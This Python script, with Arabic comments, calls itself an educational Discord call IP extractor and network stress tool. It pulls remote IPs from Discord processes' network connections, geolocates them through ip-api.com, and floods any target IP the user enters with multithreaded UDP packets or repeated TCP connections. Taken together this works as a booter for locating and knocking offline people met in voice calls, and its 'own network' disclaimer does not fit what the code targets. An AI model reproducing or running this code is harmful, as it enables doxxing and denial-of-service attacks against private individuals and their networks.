# -*- coding: utf-8 -*-
# Discord Call IP Extractor + Network Stress Tool
# pip install requests
# Educational only — use on your own network

import socket
import subprocess
import re
import sys
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor

# ============ الألوان ============
class C:
    G = "\033[92m"
    R = "\033[91m"
    Y = "\033[93m"
    B = "\033[96m"
    M = "\033[95m"
    D = "\033[90m"
    BOLD = "\033[1m"
    X = "\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{C.M}
    ####  ##   ## ##   ##
   ##  ## ###  ##  ## ##
   ##  ## #### ##   ###
   ##  ## ## ####  ## ##
    ####  ##   ## ##   ##
              {C.B}#Only{C.X}
    """)
    print(f"{C.B}{'='*60}{C.X}")
    print(f"{C.B}  DISCORD CALL IP EXTRACTOR{C.X}")
    print(f"{C.B}{'='*60}{C.X}")

# ============ 1. استخراج IP من المكالمة ============
def get_discord_pids():
    """يجلب كل PIDs لعمليات Discord"""
    pids = []
    try:
        out = subprocess.check_output(
            'tasklist /fi "imagename eq Discord.exe" /fo csv /nh',
            shell=True, encoding="utf-8", errors="ignore"
        )
        for line in out.strip().split("\n"):
            parts = line.split(",")
            if len(parts) >= 2:
                pid = parts[1].strip('"')
                if pid.isdigit():
                    pids.append(pid)
    except Exception:
        pass
    return pids

def get_connections(pid):
    """يجلب اتصالات عملية معينة"""
    udp_ips = []
    tcp_ips = []

    try:
        # UDP
        out = subprocess.check_output(
            f'netstat -ano -p UDP | findstr " {pid}$"',
            shell=True, encoding="utf-8", errors="ignore"
        )
        for line in out.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) >= 2:
                addr = parts[1]
                if ":" in addr:
                    ip = addr.rsplit(":", 1)[0]
                    ip = ip.strip("[]")
                    port = addr.rsplit(":", 1)[1]
                    if ip not in ("0.0.0.0", "127.0.0.1", "::", "::1") and not ip.startswith("192.168.") and not ip.startswith("10.") and not ip.startswith("172."):
                        udp_ips.append({"ip": ip, "port": port})
    except Exception:
        pass

    try:
        # TCP
        out = subprocess.check_output(
            f'netstat -ano -p TCP | findstr "ESTABLISHED" | findstr " {pid}$"',
            shell=True, encoding="utf-8", errors="ignore"
        )
        for line in out.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) >= 2:
                addr = parts[2]
                if ":" in addr:
                    ip = addr.rsplit(":", 1)[0]
                    ip = ip.strip("[]")
                    port = addr.rsplit(":", 1)[1]
                    if ip not in ("0.0.0.0", "127.0.0.1", "::", "::1") and not ip.startswith("192.168.") and not ip.startswith("10.") and not ip.startswith("172."):
                        tcp_ips.append({"ip": ip, "port": port})
    except Exception:
        pass

    return udp_ips, tcp_ips

def get_geo(ip):
    """يجلب معلومات IP"""
    try:
        import requests
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,org,as,query", timeout=5)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}

def extract_ips():
    banner()
    print(f"\n{C.Y}[*] Scanning Discord connections...{C.X}\n")

    pids = get_discord_pids()
    if not pids:
        print(f"{C.R}[-] Discord.exe not running{C.X}")
        input("\nPress Enter...")
        return

    print(f"{C.G}[+] Found {len(pids)} Discord process(es): {', '.join(pids)}{C.X}\n")

    all_udp = []
    all_tcp = []

    for pid in pids:
        udp, tcp = get_connections(pid)
        all_udp.extend(udp)
        all_tcp.extend(tcp)

    # إزالة المكرر
    seen_udp = set()
    seen_tcp = set()
    unique_udp = []
    unique_tcp = []

    for c in all_udp:
        key = (c["ip"], c["port"])
        if key not in seen_udp:
            seen_udp.add(key)
            unique_udp.append(c)

    for c in all_tcp:
        key = (c["ip"], c["port"])
        if key not in seen_tcp:
            seen_tcp.add(key)
            unique_tcp.append(c)

    print(f"{C.B}{'='*60}{C.X}")
    print(f"{C.B}  UDP Connections (likely voice){C.X}")
    print(f"{C.B}{'='*60}{C.X}")
    if unique_udp:
        for c in unique_udp:
            geo = get_geo(c["ip"])
            print(f"{C.G}[+]{C.X} {c['ip']}:{c['port']}")
            if geo:
                print(f"    {C.D}Country: {geo.get('country', '?')}{C.X}")
                print(f"    {C.D}City: {geo.get('city', '?')}{C.X}")
                print(f"    {C.D}ISP: {geo.get('isp', '?')}{C.X}")
    else:
        print(f"{C.Y}[!] No UDP connections found{C.X}")

    print(f"\n{C.B}{'='*60}{C.X}")
    print(f"{C.B}  TCP Connections{C.X}")
    print(f"{C.B}{'='*60}{C.X}")
    if unique_tcp:
        for c in unique_tcp:
            geo = get_geo(c["ip"])
            print(f"{C.G}[+]{C.X} {c['ip']}:{c['port']}")
            if geo:
                print(f"    {C.D}ISP: {geo.get('isp', '?')}{C.X}")
    else:
        print(f"{C.Y}[!] No TCP connections found{C.X}")

    print()
    input("Press Enter to continue...")

# ============ 2. UDP Stress ============
def udp_stress(target, port, duration, threads):
    print(f"\n{C.Y}[*] UDP stress on {target}:{port} for {duration}s with {threads} threads{C.X}\n")
    stop = time.time() + duration
    counter = [0]
    lock = threading.Lock()

    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(1024)
        local = 0
        while time.time() < stop:
            try:
                sock.sendto(payload, (target, port))
                local += 1
            except Exception:
                pass
        with lock:
            counter[0] += local

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    print(f"\n{C.G}[+] Sent {counter[0]} packets{C.X}")
    input("\nPress Enter...")

# ============ 3. TCP Stress ============
def tcp_stress(target, port, duration):
    print(f"\n{C.Y}[*] TCP stress on {target}:{port} for {duration}s{C.X}\n")
    stop = time.time() + duration
    success = 0
    fail = 0

    while time.time() < stop:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            success += 1
        except Exception:
            fail += 1

    print(f"{C.G}[+] Success: {success}{C.X}")
    print(f"{C.R}[-] Failed: {fail}{C.X}")
    input("\nPress Enter...")

# ============ 4. My IP ============
def my_ip():
    banner()
    print(f"\n{C.Y}[*] Your public IP:{C.X}")
    try:
        import requests
        ip = requests.get("https://api.ipify.org", timeout=5).text
        geo = get_geo(ip)
        print(f"\n{C.G}[+]{C.X} {ip}")
        if geo:
            print(f"    {C.D}Country: {geo.get('country', '?')}{C.X}")
            print(f"    {C.D}City: {geo.get('city', '?')}{C.X}")
            print(f"    {C.D}ISP: {geo.get('isp', '?')}{C.X}")
    except Exception as e:
        print(f"{C.R}[-] {e}{C.X}")
    input("\nPress Enter...")

# ============ القائمة ============
def menu():
    banner()
    print(f"  {C.B}[1]{C.X} Extract IPs from Discord call")
    print(f"  {C.B}[2]{C.X} UDP stress test")
    print(f"  {C.B}[3]{C.X} TCP stress test")
    print(f"  {C.B}[4]{C.X} Show my IP")
    print(f"  {C.B}[5]{C.X} Exit")
    print(f"{C.B}{'='*60}{C.X}")

def main():
    while True:
        menu()
        choice = input(f"{C.Y}Select: {C.X}").strip()

        if choice == "1":
            extract_ips()
        elif choice == "2":
            banner()
            target = input("Target IP: ").strip()
            if not target:
                continue
            port = input("Port (443): ").strip() or "443"
            duration = input("Duration (30): ").strip() or "30"
            threads = input("Threads (10): ").strip() or "10"
            try:
                udp_stress(target, int(port), int(duration), int(threads))
            except Exception as e:
                print(f"{C.R}[-] {e}{C.X}")
                input("Press Enter...")
        elif choice == "3":
            banner()
            target = input("Target IP: ").strip()
            if not target:
                continue
            port = input("Port (443): ").strip() or "443"
            duration = input("Duration (30): ").strip() or "30"
            try:
                tcp_stress(target, int(port), int(duration))
            except Exception as e:
                print(f"{C.R}[-] {e}{C.X}")
                input("Press Enter...")
        elif choice == "4":
            my_ip()
        elif choice == "5":
            print(f"{C.Y}[*] Exiting...{C.X}")
            break
        else:
            print(f"{C.R}[-] Invalid{C.X}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[*] Stopped{C.X}")
